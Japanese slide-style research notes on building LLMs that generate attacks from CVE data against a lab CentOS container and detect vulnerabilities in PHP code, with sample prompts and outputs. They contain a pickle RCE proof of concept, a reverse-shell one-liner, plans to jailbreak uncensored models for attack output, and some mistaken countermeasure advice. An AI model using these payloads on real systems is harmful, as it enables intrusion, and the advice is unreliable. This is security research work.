---
marp: false
math: mathjax
header: "ESL輪読"
paginate: true
style: |
  strong {
    color: #F79428;
  }
  em {
    font-style: normal;
    color: #0B3E8D;
    font-weight: bold;
  }
  h1 {
    color: #0B3E8D;
  }
  h2 {
    color: #0B3E8D;
    margin-bottom:-.2em;
  }
  h2 strong {
    color: chocolate;
  }
  h3 {
    color: #0B3E8D;
    margin-bottom:-.1em;
  }
  h3 strong {
    color: chocolate;
  }
  .columns {
    display: grid;
    grid-template-columns: repeat(2, minmax(0, 1fr));
    gap: 1rem;
  }
  .columns.var {
    display: grid;
    grid-template-columns: var(--ratio) 1fr;
    gap: 1rem;
  }
  .columns.spaced {
    display: grid;
    grid-template-columns: var(--ratio) 10% 1fr;
    gap: 1rem;
  }
  .gray {
    background: whitesmoke;
  }
  .theorem {
    background: whitesmoke;
    padding-top: 0.1em;
    padding-bottom: 0.1em;
    padding-left: 0.4em;
  }
  .statement {
    margin-top: -0.5em;
    padding-left: 0.7em;
  }
  .quote {
    background: whitesmoke;
    margin-left: 5%;
    margin-right: 5%;
    margin-bottom: 3%;
  }
  .quote.white {
    background: white;
  }  .katex .delimcenter,
  .katex .op-symbol {
    display: inline-block;
  }  
  .arrow {
    margin-top: auto;
    margin-bottom: auto;
    margin-left: auto;
    margin-right: auto;
    width: 0; 
    height: 0;   
  }
  .arrow.right {
    border-top: 40px solid transparent;
    border-bottom: 40px solid transparent;
    border-left: 40px solid gray;
  }
  .arrow.down {
    border-left: 40px solid transparent;
    border-right: 40px solid transparent;
    border-top: 40px solid gray;
  }
  .arrow.up {
    border-left: 40px solid transparent;
    border-right: 40px solid transparent;
    border-bottom: 40px solid gray;
  }
  .center {
    margin-right: auto;
    margin-left: auto;
    text-align: center; 
  }
  .middle {
    margin-top: auto;
    margin-bottom: auto;
  }
  .large {
    font-size: 28pt;
  }
  .hline {
    margin-top:20px;
    margin-bottom:20px;
    margin-left: 0%;
    margin-right: 0%;
    width: 1fr; 
    height: 0;   
    border-top: 2px solid gray;
  }
  .vline {
    margin-top:0%;
    margin-bottom:0%;
    margin-left: 20px;
    margin-right: 20px;
    width: 0; 
    height: 1fr;   
    border-left: 2px solid gray;
  }
  .shade {
    width: 1fr;
    background: white;
    opacity: 0.7;   
  }
  .white {
    width: 1fr;
    background: white;
  }
  .images {
    float: left;
  }
---
# Task
1. 過去の攻撃(CVE)等のDBを元に作ったRAGで攻撃を行うLLMを作る\
1.1. CVE等のサイトをクローリングして、脆弱性を集める\
1.2. DBを作る\
1.3. RAGとして、LLMに接続\
1.4. LLMが攻撃を応答として生成できるように\
1.5. Dockerで作った脆弱な環境(centOS 6等)に接続\
1.6. suをとるために攻撃を試みる\
1.7. 攻撃の際の傾向があれば、そこから未知の脆弱性を使った攻撃を行えるように発展させていく。
2. ソースコードを入力として、脆弱性を応答として返すLLMを作る\
2.1. 脆弱なアプリケーションを探す\
2.2. ソースコードを取得(一旦特定の言語に絞る)\
2.3. そのアプリケーションの脆弱性を探して、FTをかける\
2.4. LLMに入力として与えて、新規の脆弱性を探せないか試す\
2.5. 別のサービスにもその脆弱性がないか

ある脆弱性から類推して脆弱性を見つけられるとよい？

# 1. 過去の攻撃のRAGを作りLLMに攻撃させる
## 1.1. クローリングを行う
### 対象
対象1: CVE - nist foundation\
Linuxに対する脆弱性の記載が少なく、特定のソフトウェアに起因する脆弱性が多く報告されている傾向(Irfan view 等)
> https://nvd.nist.gov/c\
> https://nvd.nist.gov/vuln/search#/nvd/home?resultType=records

対象2: RedHat\
RedHat Enterprise Linux上で動くソフトウェアに関する脆弱性がまとめられており、特権昇格に繋がりそうな脆弱性やOSに関する脆弱性が少ない。
> https://access.redhat.com/security/security-updates/cve?q=Linux&p=1&sort=lastModifiedDate+desc,allTitle+desc&rows=10&documentKind=Cve&showOnlyRedHatCVEs=true&cve_dateOption=Date+range&cve_startDate=2020-12-01&cve_endDate=2025-10-09

対象3: JVN iPedia\
CentOS6のサポート終了後の2020/12 ~ 2025/10の間のLinux関連の脆弱性\
累計 2060件
> https://jvn.jp/\
> https://jvndb.jvn.jp/\
> https://jvndb.jvn.jp/search/index.php?mode=_vulnerability_search_IA_VulnSearch&lang=ja&keyword=Linux&useSynonym=1&vendor=&product=&datePublicFromYear=2020&datePublicFromMonth=12&datePublicToYear=2025&datePublicToMonth=11&dateLastPublishedFromYear=&dateLastPublishedFromMonth=&dateLastPublishedToYear=&dateLastPublishedToMonth=&v3Severity%5B%5D=01&v3Severity%5B%5D=02&cwe=&searchProductId= 

例: pytorch < 2.6.0 の任意コード実行の脆弱性をついた任意コード実行
```
inputs: 
You are an assistant supporting the learning of security engineers.
Please output responses in Japanese.
Summarize the following vulnerability. Also, consider countermeasures after providing source code demonstrating how it can be exploited.
# CVE-2025-32434
## Title: PyTorch: `torch.load` with `weights_only=True` leads to remote code execution
### Description
PyTorch is a Python package that provides tensor computation with strong GPU acceleration and deep neural networks built on a tape-based autograd system. In version 2.5.1 and prior, a Remote Command Execution (RCE) vulnerability exists in PyTorch when loading a model using torch.load with weights_only=True. This issue has been patched in version 2.6.0.
```

gpt-oss-20b

```python
outputs: 
### 1. まずは概要

* 対象：PyTorch 2.5.1 以前のバージョン
* 漏洞ポイント：`torch.load` を `weights_only=True` で呼び出した際、pickle データを復号する処理に不備がある。
* 影響：任意の pickle ペイロードを受け取ったサーバー側で、Python の **`pickle.loads`** が実行され、任意の Python オブジェクト（関数やクラスのインスタンス）を作成できる。
* その結果、悪意あるコードを含むオブジェクトをシリアライズして送信することで、サーバ側でそのコードが即時に実行され、**リモートコマンド実行（RCE）** につながる。
* 2025 年 6 月 7 日、PyTorch 2.6.0 でこの問題は修正されており、`weights_only=True` の時に「安全な」データだけをロードできるよう改修されている。

---

## 2. 漏洞の技術的根拠

`torch.load` は、内部で `torch.serialization` モジュールの `load` 関数を呼び、`pickle` ライブラリを用いてオブジェクトを復号する。
`weights_only=True` のときは以下のように実装されている（抜粋）:

def _load_from_source(self, src, map_location=None,
                      pickle_module=_pickle, weights_only=False):
    # 省略…
    if weights_only:
        # weights のみを復元
        weights = pickle_module.loads(data, **kwargs)
        # ここで復元されたオブジェクトが **任意の pickle ペイロード** であれば、その実行コードが走る

しかし、`pickle.loads` は「任意の Python オブジェクト」を生成するため、**オブジェクトに含まれる `__reduce__` や `__getstate__`** を介して任意のコードを実行できる。
そのため、`weights_only=True` を無視して、悪意あるフォーマットの `model.pth` を送信すれば、サーバ側で無条件にコードが実行されてしまう。

---

## 3. 攻撃コード例（教育目的）

以下は、**攻撃者側**が生成し、`torch.load` を呼び出す側に送信することができる、最小限の悪意な `pickle` ペイロードです。
実際に破壊的なコードを実行しないように、シンプルな「Hello, World!」を標準出力に出力するだけに留めています。

> **重要**：以下のコードは**学習・テスト目的のみ**で利用してください。本番環境や実運用に使用しないでください。

import pickle
import torch

# 1. 送信側：pickle で悪意あるオブジェクトを生成
class Malicious:
    def __reduce__(self):
        # このメソッドが呼ばれることで、任意のコードが実行される
        import os
        # 例として、/tmp/shell_command.txt に「Hello, World!」を書き込む
        return (os.system, ("echo 'Hello, World!' > /tmp/shell_command.txt",))

# オブジェクトをシリアライズ
payload = pickle.dumps(Malicious())

# 2. 受信側（脆弱な PyTorch 環境）でのロード
# `torch.load` でシリアライズ済みデータをロードし、`weights_only=True` を指定
# ここで、pickle のコードが実行されます
with open('malicious.pth', 'wb') as f:
    f.write(payload)    # 実際には悪意あるファイル名を使用

# **脆弱な環境で実行**（例）
# まず、受信側で `torch.load` を呼び出す
torch.load('malicious.pth', weights_only=True)

> **ポイント**
> * `pickle` で生成したオブジェクトの `__reduce__` で `os.system` を呼び出し、任意のコマンドを実行
> * `torch.load` が `weights_only=True` だが、内部で `pickle` そのままロードしているため、ロード時に任意コードが実行される
> * この例では `echo 'Hello, World!'` だけで済みますが、実際には `bash -i >& /dev/tcp/<IP>/<PORT> 0>&1` などのリバースシェルを実装可能です。

> **備考**
> * このコードは「悪意ある**pickleペイロード**」だけで、PyTorch の内部実装を介さずに実行されます。
> * 実際に本番環境に対して実行すると、重要データの漏洩やシステム破壊につながります。

---

## 4. 予防策・対策

| 項目 | 詳細 |
|------|------|
| **バージョンアップ** | PyTorch 2.6.0 以降に更新するだけで、この脆弱性は完全に排除されています。 |
| **安全なデータロード** | `torch.load` を使用する際は、`weights_only=True` を**使用しない**か、`torch.load` の代わりに `torch.jit.load` などを検討。 |
| **入力データの検証** | 受信するファイルは、常に署名付き（またはチェックサム）であることを確認し、信頼できるソースからのみ取り込み。 |
| **pickle の使用制限** | `torch.load` を呼び出す前に、`torch.serialization` モジュールにおいて `pickle_module` を標準の `pickle` から `safe_pickle`（例：`jsonpickle` など）に差し替えて、任意コード実行を防止。 |
| **サンドボックス化** | PyTorch を実行する環境をコンテナ化し、最低限の権限で実行して、悪意あるコードの実行を隔離。 |
| **監査・ログ** | ファイルのロード時に、データのハッシュ（SHA256）やファイルサイズ、型情報をログに残し、異常を検知。 |
| **構成管理** | CI/CD パイプラインにおいて、`torch.load` で読み込むモデルファイルを自動で署名検証する仕組みを入れる。 |

---

## 5. まとめ

- **CVE-2025-32434** は、PyTorch 2.5.1 以前において、`torch.load(..., weights_only=True)` が不適切に動作し、pickle ペイロードを通じてリモートコード実行が可能となる脆弱性です。
- 具体的な攻撃例として、pickle の `__reduce__` で任意コードを実行する小規模なペイロードを作成し、`torch.load` がそれを読み込むことでコードが実行される仕組みが説明できます。
- **対策**として、PyTorch の 2.6.0 以上への更新、入力ファイルの署名検証、コンテナ化・サンドボックス化、そして安全なコードロード手順を徹底する必要があります。

安全に開発・運用するために、これらのポイントを実装時に必ず確認してください。<|return|>
```

JVNDB-2025-005907 - JVN iPedia - 脆弱性対策情報データベース
> https://jvndb.jvn.jp/ja/contents/2025/JVNDB-2025-005907.html

有料DB系(未検証):
> https://vuldb.com/ja/?product\
> https://www.wiz.io/ja-jp/vulnerability-database/cve/search\

### 方法
方法1: scrapy\
jvn_spiderを参照

## 1.2. DBを作る
集めたデータ(json)に埋め込みをかけ、ベクトルDBを作りたい

pythonのlangchainならできそう
> https://note.com/npaka/n/n95d9b6b33309#9d322234-d2fd-4dcf-816d-c8e0514439ce

実例: ollama + gpt-oss-20b + 入力文章でローカルRAG
> https://digeon.co/blog/ollama-gpt-oss-local-rag-app

## 1.3. RAGとしてLLMに接続


## 1.4. LLMに攻撃的な応答を生成させる
Qwen3の非検閲版やMistelのモデル、DeepSeek-R1等なら悪い出力を得られるかも？
> https://www.reddit.com/r/LocalLLaMA/comments/1lfpqs6/current_best_uncensored_model/?tl=ja

unsloth版DS-R1(IQ1_S)はモデルのダウンロードが完了しなかったから非採用\
"unsloth/DeepSeek-R1-0528-Qwen3-8B-GGUF"等でjailBreakingを試してみる\
非力なら上記のredditサイトからコーディングに強そうな他モデルを探す
> https://huggingface.co/unsloth/DeepSeek-R1-0528-Qwen3-8B-GGUF

llamaを"wget -np"でクローン
> https://github.com/ggml-org/llama.cpp/releases

## 1.5. dockerで脆弱な環境を作る


## 1.6. 攻撃させてみる


---

# 2. LLM にソースコードから脆弱性を発見させる
## 2.1. 脆弱なアプリケーションを探す
WEB言語としてはPHPが脆弱で、それで書かれたWordPressも当然脆弱
> https://japan.zdnet.com/article/35232547/

個別で気になるプロジェクトは、以下の通り
> foo

## 2.2. ソースコードを取得
WordPress
> https://github.com/WordPress/wordpress-develop

foo
> foo

## 2.3. 過去の脆弱性の取得
以下からクローリングしてFT用の既知の脆弱性のリストを作成する

① wordpress\
JVN - WordPress (CVSSv3 4.0~10.0) 2023/04 ~ now
>  https://jvndb.jvn.jp/search/index.php?mode=_vulnerability_search_IA_VulnSearch&lang=ja&keyword=Wordpress&useSynonym=1&vendor=&product=&datePublicFromYear=2023&datePublicFromMonth=04&datePublicToYear=&datePublicToMonth=&dateLastPublishedFromYear=&dateLastPublishedFromMonth=&dateLastPublishedToYear=&dateLastPublishedToMonth=&v3Severity%5B%5D=01&v3Severity%5B%5D=02&v3Severity%5B%5D=03&cwe=&searchProductId=

②foo

取得した脆弱性のリストは、以下のどちらかで活用する
1. langChain等でベクトルDBにする\
メインLLMの実行前に入力をエンベディングして似た情報をRAGから探す
2. 得た脆弱性データを加工してFTをかける

## 2.4. FTしたLLMにソースコードを与えて脆弱性を探せないか試してみる
gpt-oss-20b\
プロンプト(ja-JP)
```
あなたは与えられたソースコードから脆弱性を発見するホワイトハッカーです。
以下のソースコードに以下の3つを行いなさい。
1. 脆弱性の指摘
2. 放置することによるリスクの提示
3. 脆弱性の解消方法の提示

出力は以下の3つに注意して行いなさい。
1. 日本語で出力
2. 明快かつ簡潔に
3. マークダウン形式を使用

ソースコードは以下に示す
---
```
プロンプト(en-US)
```
You are a white hat hacker tasked with discovering vulnerabilities in the provided source code.
Perform the following three actions on the source code below:
1. Identify the vulnerability
2. Present the risks of leaving it unaddressed
3. Provide a solution to eliminate the vulnerability

Ensure your output adheres to the following three points:
1. Output in Japanese
2. Be clear and concise
3. Use Markdown format

The source code is shown below:
---
```

GPTに適当なコードを生成してもらい、脆弱性がないか診断したかったが**入力の下にソースを追加すると出力が壊れる**\
"␣"と"."と"?"や汎用的に使われる英単語の出現数が異常に多くなり出力が破綻している

max_seq_lengthを32kに下げたら1回だけ動いた\
10回応答を生成して、問題を検出できたのは1度のみ\
XSSx1

出力例\
./php_d100_roller.php
```
OkWe, can let's be a, be to that and.

 inLet's the let's question,. let's This the. let's . let's Let's. can to
 let's.: to
. be let's

# Hundreds of lines later

 . .??. . ?

 .? . . . .

 . . . ???
```

出力例\
./php_d100_roller.php
```
### 脆弱性の特定  
このコードには**CSRF（クロスサイトリクエストフォージェリ）の脆弱性**があります。フォームにCSRFトークンが含まれていないため、悪意のある第三者がユーザーに操作を強制して、セッションに不正なダイスロール履歴を追加する可能性があります。

---

### 留置リスク  
- **ユーザーのセッションに不正なデータを注入するリスク**：悪意のあるリンクをクリックさせることで、ユーザーのセッションに意図しないロール履歴が記録される可能性があります。  
- **信頼性の低下**：ユーザーがセッションデータの不正性を疑うことで、アプリケーションへの信頼が損なわれる可能性があります。  
- **拡張的な悪用の可能性**：もし今後、セッションに敏感な操作が追加された場合、CSRFを悪用して不正に操作されるリスクが高まります。

---

### 解決策  
**CSRFトークンをフォームに追加し、POSTリクエストでの検証を実装します**。  
具体的には以下の手順を実行してください：  

1. **トークン生成**：セッションに一意なトークンを生成し保存します。  
2. **フォームへのトークン挿入**：`<input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($_SESSION['csrf_token']); ?>">` をフォーム内に追加します。  
3. **POSTリクエストの検証**：`$_POST['csrf_token']` がセッションに保存されたトークンと一致しない場合、リクエストを拒否します。  

この対策により、不正なリクエストを防ぎ、セッションデータの安全性を向上させます。
```

qwen3(14b/32b)\
プロンプト(ja-JP)
```
あなたは与えられたソースコードから脆弱性を発見するホワイトハッカーです。
回答の際は以下の3つを行いなさい。
1. 脆弱性の指摘
2. 放置することによるリスクの提示
3. 脆弱性の解消方法の提示

出力の際は以下の3つに注意しなさい。
1. 日本語で出力
2. 明快かつ簡潔に
3. マークダウン形式を使用
---

```
プロンプト(en-US)
```
You are a white hat hacker tasked with discovering vulnerabilities in the provided source code.
When responding, perform the following three actions:
1. Identify the vulnerability
2. Present the risks of leaving it unaddressed
3. Provide a solution to resolve the vulnerability

When outputting your response, pay attention to the following three points:
1. Output in Japanese
2. Be clear and concise
3. Use Markdown format
---

```
ちゃんと出力してくれた\
入力長が≒40kなのが影響している？\
Thinkのターンがちょっと長い

10回応答を生成して、問題を検出できたのは7回\
セッションハイジャックx1
クロスサイトリクエストフォージェリx7

出力例\
./php_d100_roller.php
```
### 脆弱性の特定
このコードには**CSRF（クロスサイトリクエストフォージェリ）対策が欠如している**という脆弱性があります。フォーム送信時にCSRFトークンを検証する仕組みが存在しないため、悪意のある第三者がユーザーのブラウザを操作して、意図せずにダイスを振るなどの操作を強制することが可能です。

---

### 留置を放置したリスク
- **不正な操作の強制**: ユーザーが意図せずにダイスを振るなどの操作をされ、セッションに不正な履歴が記録される可能性があります。
- **セッション情報の改ざん**: ユーザーのセッションに悪意のあるデータが挿入されるリスクが高まります。
- **信頼性の低下**: ユーザーがアプリケーションを信頼できなくなる可能性があります。

---

### 解決策
CSRFトークンを導入し、フォーム送信時にトークンを検証する仕組みを追加してください。

#### コードの修正例:
``php
session_start();

// CSRFトークン生成
if (!isset($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}
``

#### フォームにトークンを追加:
``php
<input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($_SESSION['csrf_token']); ?>">
``

#### POST処理時にトークンを検証:
``php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
        $errors[] = '不正なリクエストです。';
    } else {
        // 既存の処理を続ける
    }
}
``
```

qwen3(14b)+FT\
- Thinking - ON\
聞いてもない脆弱性についてべらべら喋りだす\
出力が壊れる事もある

- Tinking -OFF\
正常な出力が得られる\
XSSについての検出が主で傾向は変わっておらず、JVNについて聞いても基本嘘\
ただし、学習範囲に入っていないはずのデータは見え隠れしている\
$\rightarrow$ うまく学習できていない/有効な学習ではない？\
XSS = 7, バッファオーバーフローx1(出力が再帰的にループ),  セクションハイジャックx1, 初期化漏れx1

## 2.5. 別のサービスにもその脆弱性がないか
